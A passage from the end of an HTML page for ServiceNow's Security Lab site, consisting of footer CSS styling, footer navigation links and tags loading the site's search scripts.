    }
  }
  .logo-tagline-container img {
    height: 1.2rem;
    /*min-width: 8rem;*/
    /*width: 118px;*/
    padding-bottom: 8px;
    margin-bottom: 0px;
    /*margin-right: -1rem;
    margin-left: -1rem;*/
  }

  .logo_site_title {
    border-left: 1px solid var(--brand-gray);
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: bold;
    margin-left: 3px;
    padding-left: 10px;
    padding-right: 4px;
  }

  .logo_site_tagline {
    background-color: var(--brand-infinite-blue);
    color: var(--brand-wasabi-green);
    border-left: 1px solid var(--brand-gray);
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: normal;
    font-size: 0.8rem;
    margin-left: 10x;
    padding-left: 10px;
  }

  /*no idea what this was intended for*/
  /*links {
    border: 1px solid #e1e1e1;
    border-left: unset;
    border-right: unset;
    margin: 33px -15px 40px;
    padding: 40px 0 0;
  }*/

  ul.footer-visible-links {
    margin-bottom: 20px;
    margin-top: 0;
    padding-left: 0;
    flex: 0 0 100%;
    max-width: 100%;
  }

  .footer__menu-item-link {
    clear: unset;
    float: unset;
    margin-right: 24px;
  }

  .page__footer-nav {
    font-size: 0.6rem;
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: regular;

  }

  .page__footer-copyright {
    font-size: 0.6rem;
  }

  .footer-visible-links {
    display: flex;
    text-align: left;
    font-size: 0.6rem;
    align-items: left;
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    /*justify-content: left;*/
    -webkit-box-flex: 1;
    -ms-flex: 1;
    /*flex: 1;*/
    overflow: hidden;
  }

  .footer__menu-item a {
    display: block;
    list-style-type: none;
    white-space: nowrap;
    font-size: 0.6rem;
    margin-top: 0px;
    margin-left: 0px;
    /*margin-bottom: 20px;*/
  }
</style>


<div id="footer-container">
  <div class="footer__inner-wrap">
    <div class="masthead__menu">
      <div class="logo-tagline-container">
        
        <img src="/assets/images/servicenow-header-logo.svg" alt="Security Lab">
        
        <span class="logo_site_title">Security Lab</span>
        <span class="logo_site_tagline">Keeping your workflows secure.</span>
      </div>
      <nav id="footer-site-nav" class="page__footer-nav">
        <ul class="footer-visible-links"><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://www.servicenow.com/terms-of-use.html"  target="_blank">Terms and conditions</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://www.servicenow.com/company/trust/privacy/gdpr.html"  target="_blank">GDPR</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://www.servicenow.com/privacy-statement.html"  target="_blank">Privacy statement</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="/data-collection"  target="_blank">Data collection</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="mailto:securitylab@servicenow.com?subject=Security%20Lab%20Site%20Contact"  target="_blank">Contact Us</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://twitter.com/SNSecurityLab"  target="_blank">Twitter</a>
          </li></ul>
      </nav>
      <div class="page__footer-copyright">&copy; 2024 ServiceNow, Inc. All
        rights reserved.</div>
    </div>
  </div>
</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
